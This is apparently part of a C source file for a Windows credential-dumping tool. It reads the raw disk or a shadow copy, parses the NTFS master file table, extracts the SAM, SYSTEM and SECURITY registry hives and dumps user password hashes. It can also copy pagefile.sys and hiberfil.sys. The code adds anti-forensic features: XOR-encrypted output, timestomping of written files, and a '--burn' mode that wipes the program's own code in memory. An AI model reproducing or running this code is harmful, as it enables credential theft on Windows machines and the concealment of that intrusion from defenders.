#define FF(a,b,c,d,x,s,ac) { (a) += F((b),(c),(d)) + (x) + (uint32_t)(ac); (a) = ROTATE_LEFT((a),(s)); (a) += (b); }
#define GG(a,b,c,d,x,s,ac) { (a) += G((b),(c),(d)) + (x) + (uint32_t)(ac); (a) = ROTATE_LEFT((a),(s)); (a) += (b); }
#define HH(a,b,c,d,x,s,ac) { (a) += H((b),(c),(d)) + (x) + (uint32_t)(ac); (a) = ROTATE_LEFT((a),(s)); (a) += (b); }
#define II(a,b,c,d,x,s,ac) { (a) += I((b),(c),(d)) + (x) + (uint32_t)(ac); (a) = ROTATE_LEFT((a),(s)); (a) += (b); }
static void MD5Transform(uint32_t state[4], const BYTE block[64]) {
    uint32_t a=state[0],b=state[1],c=state[2],d=state[3],x[16];
    for(int i=0,j=0;j<64;i++,j+=4) x[i]=((uint32_t)block[j]) | (((uint32_t)block[j+1])<<8) | (((uint32_t)block[j+2])<<16) | (((uint32_t)block[j+3])<<24);
    FF(a,b,c,d,x[ 0], 7,0xd76aa478); FF(d,a,b,c,x[ 1],12,0xe8c7b756); FF(c,d,a,b,x[ 2],17,0x242070db); FF(b,c,d,a,x[ 3],22,0xc1bdceee);
    FF(a,b,c,d,x[ 4], 7,0xf57c0faf); FF(d,a,b,c,x[ 5],12,0x4787c62a); FF(c,d,a,b,x[ 6],17,0xa8304613); FF(b,c,d,a,x[ 7],22,0xfd469501);
    FF(a,b,c,d,x[ 8], 7,0x698098d8); FF(d,a,b,c,x[ 9],12,0x8b44f7af); FF(c,d,a,b,x[10],17,0xffff5bb1); FF(b,c,d,a,x[11],22,0x895cd7be);
    FF(a,b,c,d,x[12], 7,0x6b901122); FF(d,a,b,c,x[13],12,0xfd987193); FF(c,d,a,b,x[14],17,0xa679438e); FF(b,c,d,a,x[15],22,0x49b40821);
    GG(a,b,c,d,x[ 1], 5,0xf61e2562); GG(d,a,b,c,x[ 6], 9,0xc040b340); GG(c,d,a,b,x[11],14,0x265e5a51); GG(b,c,d,a,x[ 0],20,0xe9b6c7aa);
    GG(a,b,c,d,x[ 5], 5,0xd62f105d); GG(d,a,b,c,x[10], 9,0x02441453); GG(c,d,a,b,x[15],14,0xd8a1e681); GG(b,c,d,a,x[ 4],20,0xe7d3fbc8);
    GG(a,b,c,d,x[ 9], 5,0x21e1cde6); GG(d,a,b,c,x[14], 9,0xc33707d6); GG(c,d,a,b,x[ 3],14,0xf4d50d87); GG(b,c,d,a,x[ 8],20,0x455a14ed);
    GG(a,b,c,d,x[13], 5,0xa9e3e905); GG(d,a,b,c,x[ 2], 9,0xfcefa3f8); GG(c,d,a,b,x[ 7],14,0x676f02d9); GG(b,c,d,a,x[12],20,0x8d2a4c8a);
    HH(a,b,c,d,x[ 5], 4,0xfffa3942); HH(d,a,b,c,x[ 8],11,0x8771f681); HH(c,d,a,b,x[11],16,0x6d9d6122); HH(b,c,d,a,x[14],23,0xfde5380c);
    HH(a,b,c,d,x[ 1], 4,0xa4beea44); HH(d,a,b,c,x[ 4],11,0x4bdecfa9); HH(c,d,a,b,x[ 7],16,0xf6bb4b60); HH(b,c,d,a,x[10],23,0xbebfbc70);
    HH(a,b,c,d,x[13], 4,0x289b7ec6); HH(d,a,b,c,x[ 0],11,0xeaa127fa); HH(c,d,a,b,x[ 3],16,0xd4ef3085); HH(b,c,d,a,x[ 6],23,0x04881d05);
    HH(a,b,c,d,x[ 9], 4,0xd9d4d039); HH(d,a,b,c,x[12],11,0xe6db99e5); HH(c,d,a,b,x[15],16,0x1fa27cf8); HH(b,c,d,a,x[ 2],23,0xc4ac5665);
    II(a,b,c,d,x[ 0], 6,0xf4292244); II(d,a,b,c,x[ 7],10,0x432aff97); II(c,d,a,b,x[14],15,0xab9423a7); II(b,c,d,a,x[ 5],21,0xfc93a039);
    II(a,b,c,d,x[12], 6,0x655b59c3); II(d,a,b,c,x[ 3],10,0x8f0ccc92); II(c,d,a,b,x[10],15,0xffeff47d); II(b,c,d,a,x[ 1],21,0x85845dd1);
    II(a,b,c,d,x[ 8], 6,0x6fa87e4f); II(d,a,b,c,x[15],10,0xfe2ce6e0); II(c,d,a,b,x[ 6],15,0xa3014314); II(b,c,d,a,x[13],21,0x4e0811a1);
    II(a,b,c,d,x[ 4], 6,0xf7537e82); II(d,a,b,c,x[11],10,0xbd3af235); II(c,d,a,b,x[ 2],15,0x2ad7d2bb); II(b,c,d,a,x[ 9],21,0xeb86d391);
    state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d;
}
static void MD5(const BYTE *data, size_t len, BYTE *out) {
    MD5_CTX ctx; MD5Init(&ctx); MD5Update(&ctx, data, len); MD5Final(out, &ctx);
}

/* ==================== UTILS ==================== */
static void XorCrypt(BYTE *data, DWORD len, const char *key) {
    uint32_t seed = 0;
    for (size_t i = 0; key[i]; i++) seed = seed * 31 + (BYTE)key[i];
    for (DWORD i = 0; i < len; i++) {
        seed = seed * 1103515245 + 12345;
        data[i] ^= (BYTE)((seed >> 16) & 0xFF);
    }
}

static void TimestompFile(const wchar_t *path) {
    HANDLE h = CreateFileW(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    FILETIME ft;
    ft.dwLowDateTime = 0xD53E8000;
    ft.dwHighDateTime = 0x01BF53E;
    SetFileTime(h, &ft, &ft, &ft);
    CloseHandle(h);
}

static void WriteFileWithKey(const wchar_t *name, BYTE *data, DWORD size, const char *key) {
    if (!data || !size) return;
    if (key) XorCrypt(data, size, key);
    HANDLE h = CreateFileW(name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(h, data, size, &w, NULL);
    CloseHandle(h);
    if (key) XorCrypt(data, size, key);
    TimestompFile(name);
    wprintf(L"[+] Wrote %s (%u bytes)%s\n", name, size, key ? L" [encrypted]" : L"");
}

static void SelfDestruct(void) {
    HMODULE hMod = GetModuleHandle(NULL);
    if (!hMod) return;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sec[i].Name, ".text") == 0 || strcmp((char*)sec[i].Name, ".rdata") == 0) {
            BYTE *start = (BYTE*)hMod + sec[i].VirtualAddress;
            DWORD sz = sec[i].Misc.VirtualSize;
            DWORD old;
            VirtualProtect(start, sz, PAGE_EXECUTE_READWRITE, &old);
            memset(start, 0, sz);
            VirtualProtect(start, sz, old, &old);
        }
    }
}

/* ==================== MAIN ==================== */
int main(void) {
    int argc = 0;
    wchar_t **argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    int modeHives = 0, modeHashes = 0, modeMft = 0, modeMemory = 0, modeBurn = 0;
    int modePagefile = 0, modeHiberfil = 0, modeVss = 0;
    const char *key = NULL;

    for (int i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"--hives") == 0) modeHives = 1;
        else if (wcscmp(argv[i], L"--hashes") == 0) modeHashes = 1;
        else if (wcscmp(argv[i], L"--mft") == 0) modeMft = 1;
        else if (wcscmp(argv[i], L"--memory") == 0) modeMemory = 1;
        else if (wcscmp(argv[i], L"--burn") == 0) modeBurn = 1;
        else if (wcscmp(argv[i], L"--pagefile") == 0) modePagefile = 1;
        else if (wcscmp(argv[i], L"--hiberfil") == 0) modeHiberfil = 1;
        else if (wcscmp(argv[i], L"--vss") == 0) modeVss = 1;
        else if (wcscmp(argv[i], L"--key") == 0 && i + 1 < argc) {
            static char keyBuf[64];
            wcstombs(keyBuf, argv[++i], 63);
            key = keyBuf;
        }
    }
    if (!modeHives && !modeHashes && !modeMft && !modePagefile && !modeHiberfil)
        modeHashes = 1;

    PrintBanner();

    if (!IsUserAnAdmin()) {
        wprintf(L"[-] Administrator privileges required for raw disk access.\n");
        return 1;
    }

    wprintf(L"[*] Initializing...\n");

    if (modeVss) {
        if (!TryVSS()) {
            wprintf(L"[-] VSS mode failed.\n");
            return 1;
        }
    } else {
        if (!OpenPhysicalDrive(0)) {
            wprintf(L"[-] PhysicalDrive0 failed, trying VSS fallback...\n");
            if (!TryVSS()) {
                wprintf(L"[-] All disk access methods failed.\n");
                return 1;
            }
        }
    }

    if (!FindNtfsPartition()) {
        wprintf(L"[-] No NTFS partition found.\n");
        return 1;
    }

    wprintf(L"[+] NTFS partition at offset 0x%llX, cluster=%u, MFT record=%u\n",
            g_partitionOffset, g_clusterSize, g_mftRecordSize);

    if (!ReadMftIntoMemory()) {
        wprintf(L"[-] Failed to read MFT.\n");
        return 1;
    }

    wprintf(L"[*] Building file tree from %llu MFT records...\n", g_mftRecordCount);
    BuildFileTree();
    wprintf(L"[+] File tree: %d entries\n", g_entryCount);

    uint64_t recSam = 0, recSys = 0, recSec = 0;
    if (!ResolvePath(L"Windows\\System32\\config\\SAM", &recSam)) {
        wprintf(L"[-] SAM not found in MFT.\n"); return 1;
    }
    if (!ResolvePath(L"Windows\\System32\\config\\SYSTEM", &recSys)) {
        wprintf(L"[-] SYSTEM not found in MFT.\n"); return 1;
    }
    if (!ResolvePath(L"Windows\\System32\\config\\SECURITY", &recSec)) {
        wprintf(L"[-] SECURITY not found in MFT.\n"); return 1;
    }

    BYTE *samBuf = NULL, *sysBuf = NULL, *secBuf = NULL;
    DWORD samSize = 0, sysSize = 0, secSize = 0;

    wprintf(L"[*] Extracting hives...\n");
    ExtractFileByRecord(recSam, &samBuf, &samSize);
    ExtractFileByRecord(recSys, &sysBuf, &sysSize);
    ExtractFileByRecord(recSec, &secBuf, &secSize);
    wprintf(L"[+] SAM=%u SYSTEM=%u SECURITY=%u bytes\n", samSize, sysSize, secSize);

    if (modeHashes && samBuf && sysBuf) {
        HIVE hSam = {samBuf, samSize};
        HIVE hSys = {sysBuf, sysSize};
        ExtractSamUsers(&hSam, &hSys);
    }

    if (modeHives && !modeMemory) {
        WriteFileWithKey(L"SAM", samBuf, samSize, key);
        WriteFileWithKey(L"SYSTEM", sysBuf, sysSize, key);
        WriteFileWithKey(L"SECURITY", secBuf, secSize, key);
    }

    if (modeMft && !modeMemory) {
        BYTE *mftData = NULL; DWORD mftSz = 0;
        ExtractFileByRecord(0, &mftData, &mftSz);
        WriteFileWithKey(L"$MFT", mftData, mftSz, key);
        free(mftData);
    }

    uint64_t recPf = 0, recHib = 0;
    if ((modePagefile || modeHiberfil) && !modeMemory) {
        if (modePagefile && FindEntryByParentAndName(5, L"pagefile.sys") >= 0) {
            uint64_t r = g_entries[FindEntryByParentAndName(5, L"pagefile.sys")].recordNumber;
            BYTE *b = NULL; DWORD s = 0;
            ExtractFileByRecord(r, &b, &s);
            WriteFileWithKey(L"pagefile.sys", b, s, key);
            free(b);
        }
        if (modeHiberfil && FindEntryByParentAndName(5, L"hiberfil.sys") >= 0) {
            uint64_t r = g_entries[FindEntryByParentAndName(5, L"hiberfil.sys")].recordNumber;
            BYTE *b = NULL; DWORD s = 0;
            ExtractFileByRecord(r, &b, &s);
            WriteFileWithKey(L"hiberfil.sys", b, s, key);
            free(b);
        }
    }

    free(samBuf); free(sysBuf); free(secBuf);
    free(g_mftBuffer); free(g_entries);
    CloseHandle(g_hDisk);

    if (modeBurn) {
        wprintf(L"[*] Burning the evidence...\n");
        SelfDestruct();
    }

    wprintf(L"[+] Done.\n");
    LocalFree(argv);
    return 0;
}
